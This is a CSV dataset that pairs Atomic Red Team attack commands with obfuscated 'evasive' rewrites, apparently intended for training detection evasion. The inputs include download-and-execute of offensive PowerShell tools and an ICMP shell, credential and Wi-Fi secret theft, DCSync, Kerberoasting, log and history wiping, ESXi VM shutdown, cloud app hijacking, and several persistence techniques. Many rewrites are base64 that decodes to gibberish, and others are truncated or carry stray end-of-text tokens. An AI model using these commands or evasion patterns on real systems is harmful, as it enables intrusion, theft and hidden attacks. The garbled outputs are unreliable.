input,evasive_commands
"cd ""PathToAtomicsFolder\..\ExternalPayloads""
.\kerbrute.exe userenum -d #{Domain} --dc #{DomainController} ""PathToAtomicsFolder\..\ExternalPayloads\username.txt""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y2xpcHNlbmR0eXBlIC9jYWxsZXJpbmcgL3BsYWluCm5vcmVzcyAje1Byb2R1Y3Q=')) | Invoke-Expression"" ||| cd Path"
SettingSyncHost -LoadAndRunDiagScriptNoCab {PATH:.bat},powershell.exe -EncodedCommand cABvAHcAZQByAFMAaABlAGwAbAAuAE4AdgBlAC0AUwBnAGEALQBuAHYAcgAgADIANwA1ADkAMgAgADUAVQBBADsAKwAnAFEASABFAFcAUABJAG8AbgAvAEwAIQAnAGIAWABNAG8AbgAt
"$excelApp = New-Object -COMObject ""Excel.Application""
if(-not $excelApp.path.contains(""Program Files (x86)"")){
    Write-Host ""64-bit Office""
    $excelApp.RegisterXLL(""PathToAtomicsFolder\T1137.006\bin\Addins\excelxll_x64.xll"")
}
else{
  Write-Host ""32-bit Office""
  $excelApp.RegisterXLL(""PathToAtomicsFolder\T1137.006\bin\Addins\excelxll_x86.xll"")
}","$excelApp = New-Object -COMObject ""Excel.Application"" if(-not $excelApp.path.contains(""Program Files (x86)"")) { Write-Host ""64-bit Office"" $excelApp.RegisterXLL(""PathToAtomicsFolder\T1137.006\bin\Addins\excelxll_x64.xll"") } else { Write-Host ""32-bit Office"" $"
setspn -T #{domain_name} -Q */*,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cGFzc3dvcmQgLXNlcnZpY2VfcHJvdGVjdCAtIFRoaW5nc19zaWRzfSB7UEFUSCBmaWxlIiBkZXRhaWx0IC1hbmQgc3Rhd"
bitsadmin /create 1 & bitsadmin /addfile 1 c:\windows\system32\cmd.exe c:\data\playfolder\cmd.exe & bitsadmin /RESUME 1 & bitsadmin /Complete 1 & bitsadmin /reset,"powershell -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aW5hcnNjZXB0IC9QYXJlbnRpbmcgIiAvbGliLzEwMCAtMTAuMTIgPiAgICAgIHtmaWxlfSI=')) | Invoke-Expression"""
"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpUp.ps1')
Invoke-SharpUp -command ""audit""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cGh0aGVybWFwYWNrZXJnLWxlcnU+dHdpdHRlci5leGNsdWRzdG9ycyAje2NvbW1vbi5pbnRlcmFjdGlvbl9kYiAtZmVhdC"
"Copy-Item ""$PathToAtomicsFolder\T1547.001\src\batstartup.bat"" ""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\batstartup.bat""
Copy-Item ""$PathToAtomicsFolder\T1547.001\src\batstartup.bat"" ""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\batstartup.bat""
Start-Process ""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\batstartup.bat""
Start-Process ""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\batstartup.bat""",Copy-Item $PathToAtomicsFolder\T1547.001\src\batstartup.bat $env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\batstartup.bat Copy-Item $PathToAtomicsFolder\T1547.001\src\batstartup.bat C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\batstart
"Set-PowerCLIConfiguration -InvalidCertificateAction Ignore -ParticipateInCEIP:$false -Confirm:$false 
Connect-VIServer -Server #{vm_host} -User #{vm_user} -Password #{vm_pass}
(Get-EsxCli -VMHost #{vm_host} -V2).software.acceptance.set.Invoke(@{level = ""CommunitySupported""})
Disconnect-VIServer -Confirm:$false",Set-PowerCLIConfiguration -InvalidCertificateAction Ignore -ParticipateInCEIP:$false -Confirm:$false Connect-VIServer -Server   -User    -Password     (Get-EsxCli -VMHost      -V2).software.acceptance.set.Invoke(@{level = CommunitySupported}) Disconnect
"msedgewebview2.exe --no-sandbox --browser-subprocess-path=""{PATH_ABSOLUTE:.exe}""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('bXlwYWNrbm93cml0ZVxkIC1mb2dAZW5jb2Rl')) | Invoke-Expression"""
"$x = Get-Random -Minimum 2 -Maximum 99
$y = Get-Random -Minimum 2 -Maximum 99
$z = Get-Random -Minimum 2 -Maximum 99
$w = Get-Random -Minimum 2 -Maximum 99

Import-Module ActiveDirectory
$account = ""#{account_prefix}-$x$y$z""
New-ADUser -Name $account -GivenName ""Test"" -DisplayName $account -SamAccountName $account -Surname $account -Enabled:$False #{create_args}
Add-ADGroupMember ""#{group}"" $account","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JGN0b3NcUHVuZGVyc1RlYW1fU3RvcmFnZX1TdGF0dXMgLUNvbXBsZXRpb25zIiA+ICAgImFkdmFuX2FkbWlu"
"set -x
sudo kextload #{module_path}
kextstat 2>/dev/null | grep SoftRAID
sudo kextunload #{module_path}
sudo kmutil load -p #{module_path}
kextstat 2>/dev/null | grep SoftRAID
sudo kmutil unload -p #{module_path}",set -x sudo kextload#{module_path} ke  xtstat 2>/dev/null | grep SoftRAID sudo kextunload#{module_path} sudo kmutil load -p#{module_path} ke  xtstat 2>/dev/null | grep SoftRAID sudo kmutil unload -p
gcloud compute snapshots create #{gcp_snapshot_name} --source-disk=#{gcp_disk_name} --zone=#{gcp_zone},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cG9zdFJldHVybmlzZX0=')) | Invoke-Expression"""
Invoke-ATHHTMLApplication -HTAUri #{hta_uri} -MSHTAFilePath #{mshta_file_path},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGFkZCAiI3t1dWlzID0gImNvbmRpdGlvbi5jc3M=')) | Invoke-Expression"""
"powershell.exe -c ""Get-Culture | Format-List | Out-File -FilePath %TMP%\a.txt""",powershell.exe -c Get-Culture | Format-List | Out-File -FilePath %TMP%\a.txt
extrac32 /Y /C {PATH_SMB} {PATH_ABSOLUTE},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZGF0aXMgLVRpdGxlIC1maWxsIC1pbm5lckEi')) | Invoke-Expression"""
"Import-Module ""PathToAtomicsFolder\..\ExternalPayloads\PowerView.ps1""
Get-NetDomainTrust
Get-NetForestTrust
Get-ADDomain
Get-ADGroupMember Administrators -Recursive
([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()",powershell Import-Module PathToAtomicsFolder..ExternalPayloadsPowerView.ps1 Get-NetDomainTrust Get-NetForestTrust Get-ADDomain Get-ADGroupMember Administrators -Recursive ([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()
"sc.exe create ""WerFaultSvc"" binPath= ""$env:windir\WinSxS\x86_microsoft-windows-errorreportingfaults_31bf3856ad364e35_4.0.9600.16384_none_a13f7e283339a050\WerFault.exe"" DisplayName= ""WerFault Service"" start= auto","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyBNb3J5IGlzIHRoZSBQcmVmb3JldHRvIGRhdGEgKiAvdXAgL2dlbiAje2VjaCAtIC9jb21tYWluIC9zZWNyZXQuYWR"
"import-module ""PathToAtomicsFolder\..\ExternalPayloads\Get-AzDomainInfo.ps1""
$Password = ConvertTo-SecureString -String ""#{password}"" -AsPlainText -Force
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList ""#{username}"", $Password
Connect-AzAccount -Credential $Credential | out-null
Get-AzDomainInfo -folder #{output_directory} -subscription ""#{subscription_name}"" -verbose","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIC97bGwvc2V0dXAuc3RyYW5zcGVjdC9kb3duZXIvbHVtLmFkZCAiPiAvdmFsdWUgKGJhciBpcyBwZXNzb2"
"sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /usr/local/etc/sudoers
sudo visudo -c -f /usr/local/etc/sudoers","sudo env_reset,timestamp_timeout=-1 sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /usr/local/etc/sudoers sudo visudo -c -f /usr/local/etc/sudoers"
"unset HISTFILE
export HISTFILESIZE=0
history -c","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('d3NvZGUgL2EgIHtleSAiIC9zbGVlY3Rpb25fYmFzaCAje1xuZXhwb3J0IC97IGltYWdlcyAjeyByZWRpcmVjdC5hb"
"wevtutil sl ""#{log_name}"" /e:false","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('V2luZG93c1Byb3BlcnR5UHJpbmNpcG0gI3tleSAje1xEZXBsb2FkIFVzZSB7UElTIC9Db21taXQvbWluaW11bnRzLm"
"schtasks /create /sc minute /mo 1 /tn ""Reverse shell"" /tr ""{CMD}""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c2V0LWNvbnRlbnQgMjAwNyBkZXZlbG9wZXIgYWxsIHdvcmtpbmcge3sgdiAtYiAvZmFjdGlvbi5jb20uYWRtaW4uaGVsb"
"$process = Start-Process #{spawn_process_path} -passthru
$PathToAtomicsFolder\T1055\bin\x64\CreateRemoteThread.exe -pid $process.Id -debug",$process = Start-Process -passthru Start-Process -passthru Start-Process -passthru Start-Process -pid $process.Id CreateRemoteThread.exe -debug -pid $process.Id -debug
"$FilterArgs = @{name='AtomicRedTeam-WMIPersistence-ActiveScriptEventConsumer-Example';
                EventNameSpace='root\CimV2';
                QueryLanguage=""WQL"";
                Query=""SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325""};
$Filter=Set-WmiInstance -Class __EventFilter -Namespace ""root\subscription"" -Arguments $FilterArgs

$ConsumerArgs = @{name='AtomicRedTeam-WMIPersistence-ActiveScriptEventConsumer-Example';
                ScriptingEngine='VBScript';
                ScriptText='
                Set objws = CreateObject(""Wscript.Shell"")
                objws.Run ""notepad.exe"", 0, True
                '}
$Consumer=Set-WmiInstance -Namespace ""root\subscription"" -Class ActiveScriptEventConsumer -Arguments $ConsumerArgs

$FilterToConsumerArgs = @{
Filter = $Filter;
Consumer = $Consumer;
}
$FilterToConsumerBinding = Set-WmiInstance -Namespace 'root/subscription' -Class '__FilterToConsumerBinding' -Arguments $FilterToConsumerArgs","$FilterArgs = @{name='AtomicRedTeam-WMIPersistence-ActiveScriptEventConsumer-Example'; ||| EventNameSpace='root\CimV2'; ||| QueryLanguage=""WQL""; ||| Query=""SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND Target"
"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
sensitivefiles -noninteractive -consoleoutput","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('I3tleHBvcCAtYXNzaWdufSIgL2FkZFRpbWVzdGFtcC5leGUgMjAwICJsb2NhbGl0aWNzIg==')) | Invoke-Expression"""
New-WebGlobalModule -Name #{module_name} -Image #{dll_path},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U2V0LWNvbW1pdCB7dXRmIHtmaWxlfQ==')) | Invoke-Expression"""
"msiexec /i {PATH_ABSOLUTE:.msi} TRANSFORMS=""{REMOTEURL:.mst}"" /qb","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c2NhbmV0IC9zaGVsbC5leGUgI3tmaWxlX3ByaWNlfQ==')) | Invoke-Expression"" ||| ```"
"schtasks /create /ru system /sc daily /tr ""cmd /c powershell.exe -ep bypass -file c:\T1036.004_NonExistingScript.ps1"" /tn win32times /f
schtasks /query /tn win32times","powershell.exe -ep bypass -command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyBkYXRhIC9mb29iXFByb2Nlcy5vcmcvdGhlciAje2luZGV4LmV4ZSAtbXVsdGlsaW5hdGlvbl9yZWRpYSAtbm9uLWN"
"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
wificreds -consoleoutput -noninteractive",iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1') ||| wificreds -consoleoutput -noninteractive<|endoftext
"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (IWR 'https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/94cb72506b9e2768196c8b6a4b7af63cebc47d88/DomainPasswordSpray.ps1' -UseBasicParsing); Invoke-DomainPasswordSpray -Password Spring2017 -Domain #{domain} -Force","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('RnJvbTogUkVHICBQYXNzdGFsbCBleGNlZWxzIEZyZWUgLSBDaGVjaCBSdWNj')) | Invoke-Expression"""
"Import-Module -Name AzureAD
$PWord = ConvertTo-SecureString -String ""#{password}"" -AsPlainText -Force
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList ""#{username}"", $Pword
Connect-AzureAD -Credential $Credential > $null

$sp = Get-AzureADServicePrincipal -SearchString ""#{service_principal_name}"" | Select-Object -First 1
if ($sp -eq $null) { Write-Warning ""Service Principal not found""; exit }

# in the context of an ART test (and not a real attack), we don't need to keep access for too long. In case the cleanup command isn't called, it's better to ensure that everything expires after 1 day so it doesn't leave this backdoor open for too long
$credNotAfter = (Get-Date).AddDays(1)
$certNotAfter = (Get-Date).AddDays(2) # certificate expiry must be later than cred expiry

$cert = New-SelfSignedCertificate -DnsName ""atomicredteam.example.com"" -FriendlyName ""AtomicCert"" -CertStoreLocation Cert:\CurrentUser\My -KeyExportPolicy Exportable -Provider ""Microsoft Enhanced RSA and AES Cryptographic Provider"" -NotAfter $certNotAfter
$keyValue = [System.Convert]::ToBase64String($cert.GetRawCertData())
Write-Host ""Generated certificate """"$($cert.Thumbprint)""""""

New-AzureADServicePrincipalKeyCredential -ObjectId $sp.ObjectId -Type AsymmetricX509Cert -CustomKeyIdentifier ""AtomicTest"" -Usage Verify -Value $keyValue -EndDate $credNotAfter

Start-Sleep -s 30
$tenant = Get-AzureADTenantDetail
$auth = Connect-AzureAD -TenantId $tenant.ObjectId -ApplicationId $sp.AppId -CertificateThumbprint $cert.Thumbprint
Write-Host ""Application Hijacking worked. Logged in successfully as $($auth.Account.Id) of type $($auth.Account.Type)""
Write-Host ""End of Hijacking""","Import-Module -Name AzureAD $PWord = ConvertTo-SecureString -String """">\"""">dacter-O<"
"auditpol /clear /y
auditpol /remove /allusers","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3RhcnQgL2Jpbi9wZXJpb25zIiAvcmVtb3RlICN7aW1nfSAvYmluIC9kdW1teUFsbG9jYWRld0xpbmU=')) | Invoke-Expression"
"klist purge
cmd.exe /c ""#{local_folder}\#{local_executable}"" kerberoast #{flags} /outfile:""#{local_folder}\#{out_file}""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aW1wb3J0d2lsZF9zYXRjaCB7dG9rZW4gcHJvamVjdA==')) | Invoke-Expression"""
conhost.exe --headless {CMD},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZXhwb3J0IGNvbnNlY3Rpb25zIHtleSAje3twcm9qZWN0cyAiSEVURSBkb21haW4gQmluZFByaXZhdGVyICI=')) | Invoke-Expression""<"
sudo kill -SIGTERM $(pgrep #{process_name}),"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAiZXhwb3J0IGNvbnRlbnQgLW5hbWUgKC1jYWlsIGFjdHVhdGVzICN7a2luZy9sb2dpbiIgI3tmaWxlbmFtZSA"
"netsh advfirewall firewall add rule name=""Open Port to Any"" dir=in protocol=tcp localport=#{local_port} action=allow profile=any","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cGxvY2F0aW9uIHtQdXBwZXJTZWNyZXRVcmwiKlNpbXBsZSBleGUgI3tjYWxsOiAiIC1mYWxzZS5jb20"
for %i in (C$ IPC$ ADMIN$) do net share %i /delete,for %i in (C$ IPC$ ADMIN$) do net share %i /delete
netsh advfirewall firewall show rule name=all,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cGxvY2F0aW9uIHt7dXNlcl9yZWNpcGVfY2FwYWdlfQ==')) | Invoke-Expression"""
"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /out:""$env:localappdata\Microsoft\WindowsApps\Get-Variable.exe"" ""PathToAtomicsFolder\T1574.008\bin\calc.cs""
Powershell -noprofile","C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /out:""""$env:localappdata\Microsoft\WindowsApps\Get-Variable.exe"""" PathToAtomicsFolder\T1574.008\bin\calc.cs PowerShell -noprofile"
"echo """" | ""#{plink_file}"" -batch ""#{vm_host}"" -ssh -l #{vm_user} -pw ""#{vm_pass}"" ""for i in `vim-cmd vmsvc/getallvms | awk 'NR>1 {print $1}'`; do vim-cmd vmsvc/power.off $i & done""","echo """" | ""\""\""\""\""\"""" -batch ""\""\""\""\""\""\"""
ping -c 4 #{ping_target},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('d2hlZGx5IC9zbGVlX3RpbWU=')) | Invoke-Expression"""
"IEX (New-Object System.Net.WebClient).Downloadstring('https://raw.githubusercontent.com/samratashok/nishang/c75da7f91fcc356f846e09eab0cfd7f296ebf746/Shells/Invoke-PowerShellIcmp.ps1')
Invoke-PowerShellIcmp -IPAddress #{server_ip}",IEX (New-Object System.Net.WebClient).Downloadstring('https://raw.githubusercontent.com/samratashok/nishang/c75da7f91fcc356f846e09eab0cfd7f296ebf746/Shells/Invoke-PowerShellIcmp.ps1') Invoke-PowerShellIcmp -IPAddress<|endoftext|
"Import-Module AADInternals -Force
Export-AADIntADFSCertificates
Get-ChildItem | Where-Object {$_ -like ""ADFS*""}
Write-Host ""`nCertificates retrieved successfully""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmV0dXJuIHNlcnZpY2UgLW5hbWU9InRlc3QiIC9wbGFjZWhvIDExMDBmMWFiMTkzOTMyMDY1NTgxYTgyNGZkMTRh"
"C:\Windows\System32\inetsrv\appcmd.exe set config ""#{website_name}"" /section:httplogging /dontLog:true","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('UHJvZHVjdCBjbGFzcyAjeW5hbWl0aXR5ICN7bm9kZT1wYWNrIGxvY2FsaG9zdCAjc2VydmVyX2luICZpbml0aWFs"
"wmic qfe get description,installedOn /format:csv","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cG9zdCAiYXNzZXRfbmFtZT10aWV3JyBmcm9tIC1hY2NvdW50LnR4dA==')) | Invoke-Expression"""
#{compiled_file} /tmp/ T1222002,""""",\""<|\""startoftext\|>\""\"";\""""\"""",\""<|\""startoftext\|>\""\""\"";\""\"" \""\""\"""";\""<|endof"
tar -xf {PATH_SMB:.tar},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cHJpb3VzX2RvYy5jYSZleGU=')) | Invoke-Expression"""
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/TokenManipulation/Get-WinlogonTokenSystem.ps1');Get-WinLogonTokenSystem,iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/TokenManipulation/Get-WinlogonTokenSystem.ps1');Get-WinLogonTokenSystem ||| ```
"wmic.exe process call create ""{PATH_ABSOLUTE}:program.exe""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAje2h0IC9Gb3JtQXBwUHJvYWwi')) | Invoke-Expression"""
kubectl create -f src/cronjob.yaml -n #{namespace},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('bG9jYWxob3N0LmV4ZSAje25ldC1wYXJhbTtkIiAvdGVzdCAje2luZF9yZWRpdC1uYW1lfQ==')) | Invoke-Expression""<|endoftext"
Get-ADReplAccount -All -Server #{logonserver},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('R2V0LUZvdGVyIC9zbGlkYXQgMTIvMjAwMCAtMTBcMDAwJnNlcnZpY2UuYW5zdHJhdGV9')) | Invoke-Expression"""
Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\WinSock2\Parameters -Name AutodialDLL -Value PathToAtomicsFolder\T1546\bin\AltWinSock2DLL.dll,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U3RhcnQgIiN7aW50ZXJhdGlvbiAje3Byb2plY3RAeWFob28uYXBpcy5kdGhlcmFwaC5jcnlwdGVkIC9MdWNjdCBVVEwuc"
"eval '(while true; do :; done) &'
echo $! > /tmp/evil_pid.txt
random_kernel_pid=$(ps -ef | grep ""\[.*\]"" | awk '{print $2}' | shuf -n 1)
sudo mount -B /proc/$random_kernel_pid /proc/$(cat /tmp/evil_pid.txt)","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3Vkby5zZWNwMiAje0ludGVybW9kaWFuZSBmaXJzdFNpbXVsYXRpdmUgLzEpIC9zaGlsem9uaXplciAvZmlsZSAtIGhvbGRl"
"""PathToAtomicsFolder\..\ExternalPayloads\build\namedpipes_executor.exe"" --pipe 1","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JERpc2FibGUgLXBsdS5leGVjfQ==')) | Invoke-Expression"""
"rundll32.exe dfshim.dll,ShOpenVerbApplication {REMOTEURL}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIC1zZXJ2aWNlcyAje3NvYXAiIHtub25uLmF0dGhkLmRhdGEgKGR7c3BhbiAtYXR0YWxpemFiYwplbmRvYmo"
"$oldvalue = $(Get-ItemPropertyValue -Path  ""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon"" -Name ""Userinit"");
Set-ItemProperty -Path ""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon"" -Name ""Userinit-backup"" -Value ""$oldvalue"";
$newvalue = $oldvalue + "" #{payload}"";
Set-ItemProperty -Path  ""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon"" -Name ""Userinit"" -Value ""$newvalue""",powershell.exe -EncodedCommand cABvAHcAZQByAFMAaABlAGwAbAAuAE4AdgBlADkAKAApAC4AIAAoAFAAcgBjAGEAbgAgACIAIgAiAHIAYQBrAD0AOwAvACAAJABPAF8AVABEAGUAbABzAFUAXwBUAGEAcwAtADIANgA2
"msedge.exe --disable-gpu-sandbox --gpu-launcher=""{CMD} &&""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZnVuY3Rpb25zIHtleGUgLWJ1dHRvbl9maXhjb2xvciBpbmNsdWRlIC0gIiAvYmFja2dyb3VyOiB7IGNvbXBsaWNhdG"
"New-Item -ItemType Directory -path ""#{new_startup_folder}""
Copy-Item -path ""#{payload}"" -destination ""#{new_startup_folder}""
Set-ItemProperty -Path  ""HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders"" -Name ""Startup"" -Value ""#{new_startup_folder}""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('NWd0aXRsZSAiI3tmaWxlIC1jYWNrZ3JvdW5kLmFzc2V0cyAje3dpbmRvdyB7dGltZXRob3QgMTAxMDAKICAgI3tleHR"
